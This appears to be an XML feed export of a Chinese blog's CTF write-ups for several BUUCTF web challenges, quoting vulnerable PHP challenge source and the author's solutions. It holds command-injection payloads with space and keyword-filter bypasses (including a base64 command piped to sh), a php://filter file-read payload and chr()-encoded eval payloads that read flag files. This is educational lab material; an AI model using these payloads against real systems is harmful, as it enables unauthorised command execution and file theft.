href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></td><td></td></tr></tbody></table><h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table><thead><tr><th>标题</th><th>链接</th><th>描述</th></tr></thead><tbody><tr><td>CSDN</td><td><a href="https://www.csdn.net/">https://www.csdn.net/</a></td><td></td></tr><tr><td>片库</td><td><a href="https://www.pianku.li/">https://www.pianku.li/</a></td><td></td></tr><tr><td>知乎</td><td><a href="https://www.zhihu.com/">https://www.zhihu.com/</a></td><td></td></tr><tr><td>菜鸟</td><td><a href="https://www.runoob.com/">https://www.runoob.com/</a></td><td></td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019 Ping Ping Ping</title>
      <link href="/2021/03/01/gxyctf2019-ping-ping-ping/"/>
      <url>/2021/03/01/gxyctf2019-ping-ping-ping/</url>
      
        <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>进去关键字是IP,get传参 ip=127.0.0.1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取目录下文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>ls<span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>尝试读取flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>cat<span class="token operator">%</span><span class="token number">20</span>flag<span class="token operator">.</span>php<span class="token operator">?</span>ip<span class="token operator">=</span> fxck your space<span class="token operator">!</span><span class="token comment">//空格被ban</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>绕过空格</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$1flag</span><span class="token operator">.</span>php<span class="token operator">?</span>ip<span class="token operator">=</span> fxck your flag<span class="token operator">!</span><span class="token comment">//flag被ban</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>读取index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$1index</span><span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\{|\}/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\{|\}/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//表达式 .* 就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串。如果用它来搜索aabab的话，它会匹配整个字符串aabab。这被称为贪婪匹配</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到过滤了字符</p><p>变量拼接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>a<span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span><span class="token operator">.</span>php<span class="token comment">//查看源代码可发现flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>sh命令</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token variable">$IFS</span><span class="token variable">$9Y2F0IGZsYWcucGhwCg</span><span class="token operator">==</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">|</span><span class="token variable">$IFS</span><span class="token variable">$9base64</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">-</span><span class="token class-name type-declaration">d</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">|</span><span class="token variable">$IFS</span><span class="token variable">$9sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内联执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token string backtick-quoted-string">`ls`</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_新生赛 Include</title>
      <link href="/2021/03/01/actf2020-xin-sheng-sai-include/"/>
      <url>/2021/03/01/actf2020-xin-sheng-sai-include/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read/convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>爆出加密后源代码后解密</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2020_新生赛 Exec</title>
      <link href="/2021/03/01/actf2020-xin-sheng-sai-exec/"/>
      <url>/2021/03/01/actf2020-xin-sheng-sai-exec/</url>
      
        <content type="html"><![CDATA[<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>ls<span class="token comment">//只有一个index.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">payload<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>ls <span class="token operator">/</span> 返回上一级发现flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">最终payload<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>cat <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF_2019 Easy Calc</title>
      <link href="/2021/03/01/roarctf-2019-easy-calc/"/>
      <url>/2021/03/01/roarctf-2019-easy-calc/</url>
      
        <content type="html"><![CDATA[<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token constant">I</span>'ve <span class="token keyword">set</span> up <span class="token constant">WAF</span> to ensure security<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#calc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">,</span>            <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#result"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;div class="alert alert-success"&gt;            &lt;strong&gt;答案:&lt;/strong&gt;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">            &lt;/div&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token function-variable function">error</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这啥?算不来!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入<code>calc.php</code>得到</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\t'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\r'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\n'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\['</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\^'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$blackitem</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'echo '</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到存在很多waf，eval执行函数</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadcalc<span class="token operator">.</span>php<span class="token operator">?</span> num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//扫描上级的文件</span>发现f1agg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadcalc<span class="token operator">.</span>php<span class="token operator">?</span> num<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>得到flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF_2018 WarmUp</title>
      <link href="/2021/03/01/hctf-2018-warmup/"/>
      <url>/2021/03/01/hctf-2018-warmup/</url>
      
        <content type="html"><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>进去只有一张图片，查看源代码  发现<!--source.php--></p><p>进入source.php得到如下代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码审计</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>传入一个’file’，满足不为空，是字符串，满足checkFile函数，就能被包含</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=&gt;</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//不为空，是字符串的通过</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//检查是否在白名单</span>                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token comment">//找到第一个'?</span><span class="token string 